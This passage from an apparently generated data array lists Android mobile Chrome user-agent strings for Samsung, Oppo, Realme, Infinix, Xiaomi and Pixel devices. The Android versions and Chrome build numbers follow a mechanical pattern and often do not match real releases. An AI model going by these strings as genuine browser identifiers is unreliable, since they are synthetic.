  "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1156.114 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1173.121 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1190.128 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1207.135 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1224.142 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1241.149 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1258.156 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1275.163 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1292.170 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1309.177 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1326.184 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1343.191 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1360.198 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2285) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1377.205 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1394.212 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1411.219 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2171) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1428.226 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1445.233 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1462.240 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1479.247 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1496.54 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; RMX3561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1513.61 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; RMX2193) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1530.68 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1547.75 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1564.82 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1581.89 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1598.96 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Infinix X665B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1615.103 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1632.110 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1649.117 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.1666.124 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1683.131 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; 22011119TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1700.138 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1717.145 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.1734.152 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; 22081212C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1751.159 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.1768.166 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1785.173 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.1802.180 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1819.187 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.1836.194 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.1853.201 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.1870.208 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.1887.215 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.1904.222 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.1921.229 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.1938.236 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.1955.243 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.1972.50 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1989.57 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.2006.64 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2023.71 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2040.78 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2057.85 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2074.92 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2091.99 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.2108.106 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2125.113 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2142.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2159.127 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2176.134 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2193.141 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2210.148 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2227.155 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2244.162 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2261.169 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2278.176 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2295.183 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2285) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2312.190 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.2329.197 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.2346.204 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2171) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2363.211 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2380.218 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2397.225 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2414.232 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2431.239 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; RMX3561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.2448.246 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX2193) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2465.53 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2482.60 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2499.67 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2516.74 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2533.81 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Infinix X665B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2550.88 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2567.95 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2584.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2601.109 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2618.116 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; 22011119TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2635.123 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2652.130 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.2669.137 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; 22081212C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.2686.144 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2703.151 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2720.158 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2737.165 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2754.172 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2771.179 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.2788.186 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2805.193 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2822.200 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2839.207 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2856.214 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2873.221 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2890.228 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2907.235 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2924.242 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2941.249 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2958.56 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2975.63 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2992.70 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3009.77 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3026.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3043.91 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3060.98 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3077.105 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3094.112 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3111.119 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3128.126 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3145.133 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3162.140 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3179.147 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3196.154 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3213.161 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3230.168 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2285) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3247.175 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3264.182 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3281.189 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2171) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3298.196 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3315.203 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3332.210 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3349.217 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3366.224 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX3561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3383.231 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX2193) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3400.238 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3417.245 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3434.52 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3451.59 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3468.66 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Infinix X665B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3485.73 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Infinix X6817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3502.80 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3519.87 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3536.94 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3553.101 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; 22011119TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3570.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3587.115 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3604.122 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 22081212C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3621.129 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3638.136 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3655.143 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3672.150 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3689.157 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3706.164 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3723.171 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3740.178 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3757.185 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3774.192 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3791.199 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3808.206 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3825.213 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3842.220 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3859.227 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3876.234 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3893.241 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3910.248 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3927.55 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3944.62 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3961.69 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3978.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3995.83 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4012.90 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4029.97 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4046.104 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4063.111 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4080.118 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4097.125 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4114.132 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4131.139 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4148.146 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4165.153 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; CPH2285) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4182.160 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4199.167 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; CPH2219) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4216.174 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; CPH2171) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4233.181 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4250.188 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4267.195 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4284.202 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4301.209 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; RMX3561) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4318.216 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; RMX2193) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4335.223 Mobile Safari/537.36",
